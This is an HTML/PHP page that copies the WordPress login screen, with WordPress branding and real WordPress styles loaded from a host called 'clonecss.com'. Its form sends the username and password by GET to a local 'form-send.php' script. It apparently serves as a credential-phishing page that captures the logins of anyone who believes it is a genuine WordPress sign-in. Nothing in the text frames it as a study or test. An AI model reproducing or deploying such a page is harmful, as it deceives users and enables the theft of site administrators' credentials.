<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>


    <!-- Последняя компиляция и сжатый CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

    <!-- Дополнение к теме -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

    <!-- Последняя компиляция и сжатый JavaScript -->
    <link rel='stylesheet' href='http://clonecss.com/wp-admin/load-styles.php?c=0&amp;dir=ltr&amp;load%5B%5D=dashicons,buttons,forms,l10n,login&amp;ver=4.9.5' type='text/css' media='all' />

</head>


<body class="login wp-core-ui ">
<div id="login">
    <h1><a href="https://wordpress.org/" title="Powered by WordPress" tabindex="-1">Powered by WordPress</a></h1>

    <form action="form-send.php" method="get">
        <p>
            <label for="user_login">Username or Email Address<br />
                <input type="text" name="user_name" id="user_login" class="input" value="" size="20" /></label>
        </p>
        <p>
            <label for="user_pass">Password<br />
                <input type="password" name="password" id="user_pass" class="input" value="" size="20" /></label>
        </p>
        <p class="forgetmenot">
            <label for="rememberme">
                <input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> Remember Me</label>
        </p>
        <p class="submit">
            <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
        </p>
    </form>

    <p id="nav">
        <a href="">Lost your password?</a>
    </p>


</div>


<div class="clear"></div>

<?php include_once "index.html"; ?>

</body>
</html>